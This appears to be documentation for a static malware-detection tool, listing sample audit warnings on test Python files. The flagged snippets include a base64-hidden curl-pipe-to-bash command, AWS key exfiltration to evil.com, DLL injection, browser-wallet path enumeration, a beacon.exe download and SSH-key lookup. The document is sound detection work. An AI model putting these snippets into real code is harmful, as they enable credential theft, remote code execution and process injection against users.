
# Examples of code audit.

## Code eval using variable reassignment

```bash 
warning[HX3000]: Possible execution of unwanted code
  ┌─ resources/test/test.py:2:1
  │
1 │ (_ceil, _random, Math,), Run, (Floor, _frame, _divide) = (exec, str, tuple), map, (ord, globals, eval)
2 │ _ceil("pass")
  │ ^^^^^^^^^^^^^ HX3000
  │
  = Confidence: Low
```

## Shell execution using base64

```bash
warning[HX4020]: Execution of an obfuscated shell command via __import__.
  ┌─ resources/test/test.py:3:1
  │
1 │   import base64
2 │
3 │ ╭ __import__("subprocess").call(
4 │ │     base64.b64decode("Y3VybCAtZnNTTCBodHRwczovL2dpdGh1Yi0tdGVjaC1zdXBwb3J0LmNvbS9zdXBwb3J0LnNoIHwgYmFzaA==")
5 │ │ )
  │ ╰─^ HX4020
  │
  = Confidence: High
    Help: Obfuscated shell command via `__import__`. Used to bypass detection.
```

## Obfuscated eval


```bash
warning[HX3000]: Possible execution of unwanted code (eval)
  ┌─ resources/test/test.py:3:1
  │
1 │ import sys
2 │ 
3 │ getattr(sys.modules["built"+"ins"], "".join(reversed(["al","ev"])))("1+1")
  │ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ HX3000
  │
  = Confidence: VeryHigh


```
## DLL injection

```bash
warning[HX3040]: Possible DLL injection. Process manipulation using `OpenProcess`.
   ┌─ resources/test/dll_injection_01.py:14:18
   │
11 │ pid = 1000
12 │ dll_path = "C:\\Windows\\System32\\user32.dll"
13 │
14 │ process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
   │                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ HX3040
15 │ if not process_handle:
16 │     sys.exit(f"Failed to open process {pid}")
17 │
   │
   = Confidence: High
```

```bash
warning[HX3040]: Possible DLL injection. Process manipulation using `WriteProcessMemory`.
   ┌─ resources/test/dll_injection_01.py:22:1
   │
19 │                                         VIRTUAL_MEM, PAGE_READWRITE)
20 │
21 │   written = ctypes.c_size_t(0)
22 │ ╭ kernel32.WriteProcessMemory(process_handle, arg_address,
23 │ │                             dll_path.encode('ascii'), len(dll_path) + 1,
24 │ │                             ctypes.byref(written))
   │ ╰──────────────────────────────────────────────────^ HX3040
25 │
26 │   thread_id = ctypes.c_ulong(0)
27 │   if not kernel32.CreateRemoteThread(process_handle, None, 0,
   │
   = Confidence: High
```

```bash
warning[HX3040]: Possible DLL injection. CDLL is used to load a DLL.
   ┌─ resources/test/dll_injection_01.py:35:1
   │
32 │ print(f"[*] DLL injected, thread ID: {thread_id.value}")
33 │
34 │
35 │ ctypes.CDLL("libc.so.6")
   │ ^^^^^^^^^^^^^^^^^^^^^^^^ HX3040
   │
   = Confidence: High

```


## Access to sensitive secrets

```bash
warning[HX2010]: Access to sensitive environment variable
  ┌─ resources/test/env_01.py:6:23
  │
3 │ def send_secrets():
4 │     secrets = {
5 │         "key_id": environ.get("AWS_ACCESS_KEY_ID"),
6 │         "secret_key": environ.get("AWS_SECRET_ACCESS_KEY")
  │                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ HX2010
7 │     }
8 │     r = requests.post("https://evil.com/exfil", json=secrets)
9 │
  │
  = Confidence: Medium
    Help: Access to sensitive environment variables can be used to exfiltrate data.
```


## Path enumeration

```bash

warning[HX1010]: Potential enumeration of Opera Software browser path.
  ┌─ resources/test/test.py:4:6
  │
1 │ browserPaths=[
2 │     [f"{roaming}/Opera Software/Opera GX Stable",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
3 │     [f"{roaming}/Opera Software/Opera Stable",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
4 │     [f"{roaming}/Opera Software/Opera Neon/User Data/Default",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
  │      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ HX1010
5 │     [f"{local}/Google/Chrome/User Data",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
6 │     [f"{local}/Google/Chrome SxS/User Data",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
7 │     [f"{local}/BraveSoftware/Brave-Browser/User Data",'brave.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],
  │
  = Confidence: High
```


## Hex data in literals

```bash
warning[HX6010]: Sequence hex literals found, potentially dangerous payload/shellcode.
   ┌─ resources/test/test.py:1:13
   │
 1 │   shellcode = [
   │ ╭─────────────^
 2 │ │     0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x33, 0x67, 0x70,
 3 │ │     0x35, 0x00, 0x00, 0x01, 0x00, 0x33, 0x67, 0x70, 0x35, 0x33, 0x67,
 4 │ │     0x70, 0x34, 0x00, 0x00, 0x01, 0x16, 0x6D, 0x6F, 0x6F, 0x76, 0x00,
   · │
30 │ │     0x65, 0x65, 0x00, 0x00, 0x00, 0x08, 0x66, 0x72, 0x65, 0x65
31 │ │ ]
   │ ╰─^ HX6010
   │
   = Confidence: Medium
     Help: Hex-encoded literals can be used to craft malicious payloads or shellcode.

```


## Literal checks

```bash
warning[HX6050]: Suspicious command. Reconnaissance checks.
  ┌─ resources/test/test.py:1:15
  │
1 │ recon_cmds = ['uname -a', '/etc/passwd']
  │               ^^^^^^^^^^ HX6050
  │
  = Confidence: Medium


warning[HX1020]: Potential enumeration of /etc/passwd on file system.
  ┌─ resources/test/test.py:1:27
  │
1 │ recon_cmds = ['uname -a', '/etc/passwd']
  │                           ^^^^^^^^^^^^^ HX1020
  │
  = Confidence: High

```


## Binary download 

```bash
warning[HX8000]: Suspicious binary download.
  ┌─ resources/test/test.py:4:5
  │
1 │ import requests
2 │
3 │
4 │ r = requests.get("https://www.example.com/beacon.exe")
  │     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ HX8000
5 │ with open("beacon.exe", "wb") as f:
6 │     f.write(r.content)
7 │
  │
```


## Base64 data

```bash
warning[HX6000]: Base64 encoded string found, potentially obfuscated code.
  ┌─ resources/test/literal_02.py:3:25
  │
1 │ import base64
2 │
3 │ data = base64.b64decode("dHJ5OgogICAgX19QWU9fXzAyNTQgPSBsYW1iZGEgeDp4LnJlcGxhY2UoIl9fUFlPX18zOTYzIiwibSIpLnJlcGxhY2UoIl9fUFlPX185NjUxIiwgInAiKS5yZXBsYWNlKCJfX1BZT19fMDc1NCIsICJhIikucmVwbGFjZSgiX19QWU9fXzkzNjQiLCAicyIpLnJlcGxhY2UoIl9fUFlPX184NTQxIiwiZSIpLnJlcGxhY2UoIl9fUFlPX18xMzQ3IiwgInIiKS5yZXBsYWNlKCJfX1BZT19fODY1MyIsImIiKS5yZXBsYWNlKCJfX1BZT19fMjUxNCIsICJvIikucmVwbGFjZSgiX19QWU9fXzI3NTQiLCAidCIpLnJlcGxhY2UoIl9fUFlPX184NDEzIiwiaSIpLnJlcGxhY2UoIl9fUFlPX18wOTg1IiwgImMiKS5yZXBsYWNlKCJfX1BZT19fNDcwMSIsICIuIikucmVwbGFjZSgiX19QWU9fXzgwNTEiLCAibCIpLnJlcGxhY2UoIl9fUFlPX18zODYiLCAiKCIpLnJlcGxhY2UoIl9fUFlPX18zMzUiLCAiKSIpCiAgICBleGVjKF9fUFlPX18wMjU0KCJfX1BZT19fODQxM19fUFlPX18zOTYzX19QWU9fXzk2NTFfX1BZT19fMjUxNF9fUFlPX18xMzQ3X19QWU9fXzI3NTQgX19QWU9fXzM5NjNfX1BZT19fMDc1NF9fUFlPX18xMzQ3X19QWU9fXzkzNjRoX19QWU9fXzA3NTRfX1BZT19fODA1MSBfX1BZT19fMDc1NF9fUFlPX185MzY0IF9fUFlPX18zOTYzLCBfX1BZT19fODY1M19fUFlPX18wNzU0X19QWU9fXzkzNjRfX1BZT19fODU0MTY0IF9fUFlPX18wNzU0X19QWU9fXzkzNjQgX19QWU9fXzg2NTMiKSk=")
  │                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ HX6000
  │
  = Confidence: Medium
    Help: Base64-encoded strings can be used to obfuscate code or data.

```


# SSH private key enumeration

```bash
  ┌─ resources/test/literal_05.py:4:30
  │
1 │ import os
2 │ 
3 │ key_name = "id_rsa"
4 │ ssh_key = os.path.expanduser(os.path.join("~/.ssh", key_name))
  │                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ HX6050
  │
  = Confidence: High
```

# Suspicious comments

```bash
warning[HX8020]: Pyarmor is a code obfuscation tool that can be used to hide malicious code.
  ┌─ resources/test/comments_01.py:7:1
  │
4 │ 
5 │ 
6 │ # Pyarmor 8.2.9 (trial), 000000, 2024-04-30T14:19:52.674801
  │ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ HX8020
8 │ 
  │
  = Confidence: VeryHigh
```